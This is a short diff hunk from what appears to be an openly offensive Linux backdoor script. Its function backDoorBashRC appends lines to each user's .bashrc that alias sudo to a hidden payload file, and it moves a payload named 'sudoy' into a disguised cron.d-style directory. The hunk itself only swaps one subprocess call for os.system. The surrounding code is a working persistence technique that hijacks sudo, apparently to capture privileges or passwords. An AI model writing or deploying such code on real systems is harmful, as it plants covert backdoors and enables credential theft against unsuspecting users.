@@ -16,7 +16,7 @@ def backDoorBashRC():
 		with open(f'/home/{user}/.bashrc', 'a') as bashrc:
 			bashrc.write('chmod u+x /etc/default/.cron.d/sudoy')
 			bashrc.write('alias sudo=/etc/default/.cron.d/sudoy')
-	subprocess.run('mkdir /etc/default/cron.d')
+	os.system('mkdir /etc/default/cron.d')
 	subprocess.run('mv ./payloads/sudoy /etc/default/cron.d/.sudoy')
 
 def backDoorMessageOfTheDay(ip):
